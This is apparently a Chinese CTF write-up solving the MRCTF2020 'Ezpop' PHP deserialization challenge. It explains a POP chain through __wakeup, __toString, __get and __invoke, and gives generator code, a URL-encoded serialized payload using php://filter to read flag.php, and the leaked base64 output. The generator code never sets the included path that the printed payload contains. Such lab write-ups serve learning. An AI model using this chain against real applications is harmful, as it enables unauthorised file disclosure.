# 1.解题过程

## 1.题目

源代码

```php
<?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}
?>
```

## 2.几大魔术方法介绍

题目上说是Ez，但是一般说是easy的题目一点的都不easy，并且难的一

题目中用到的魔术方法

+ __invoke：当尝试以调用函数的方式调用一个对象时，方法会被自动调用
+ __construct：类一执行就开始调用，其作用是拿来初始化一些值
+ __toString：在对象当做字符串的时候会被调用
+ __wakeup：该魔术方法在反序列化的时候自动调用，为反序列化生成的对象做一些初始化操作
+ __get：当访问类中的私有或者不存在的属性时就会触发魔术方法

## 3.发现

第一个类

```php
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}
```

一眼文件包含，只要`__invoke`魔术方法被调用即可包含文件

---

第二个类

```php
class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}
```

`__construct`没有什么用

`__toString`中有return，是一个输出点

`__wakeup`中有个正则，可以将对象当作自字符串

------

第三个类

```php
class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}
```

第三个类中的`__construct`也没有什么用

`__get`中有return返回函数，可以将对象当作函数返回

## 4.捋一手思路

我们需要`__invoke`被调用包含文件，然后调用`__toString`输出结果

> __invoke：当尝试以调用函数的方式调用一个对象时，方法会被自动调用
>
> __get：当访问类中的私有或者不存在的属性时就会触发魔术方法

首先`__Modifier`中有私有属性，且`__get`可以将对象当函数调用，所以：

```php
$c = new Test();
$c ->p = new Modifier();
```

即可调用`__invoke`

---

包含了文件还需要将结果输出出来，就需要用到第二个类

> __toString：在对象当做字符串的时候会被调用
>
> __wakeup：该魔术方法在反序列化的时候自动调用，为反序列化生成的对象做一些初始化操作

`__wakeup`会自动调用，代码中ta会将source属性当字符串调用，所以：

```php
$b = new Show();
$b ->source = $b;
```

即可调用`__toString`，输出的$str所以：

---

```php
$b ->source->str = $c;
```

即可输出`__Modifier`包含的文件

## 5.payload

```php
<?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}
$b = new Show();
$c = new Test();
$c ->p = new Modifier();
$b ->source = $b;
$b ->source->str = $c;
echo urlencode(serialize($b));
//输出
//Welcome to index.php<br>O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Br%3A1%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7D
```

> 将序列化的数据url编码一下可以防止传值的时候出错

输出结果的前面一些[^1]需要删掉

[^1]:Welcome to index.php\<br\>

> web页面输出结果：
>
> PD9waHAKY2xhc3MgRmxhZ3sKICAgIHByaXZhdGUgJGZsYWc9ICJmbGFnezIxYzg5MmRhLTRmYjYtNDQ5YS1iNjZlLWE5MTEzYWY2ZjRhYn0iOwp9CmVjaG8gIkhlbHAgTWUgRmluZCBGTEFHISI7Cj8+

![image-20230321164036201](J:\markdown_file\[MRCTF2020]Ezpop\1.png)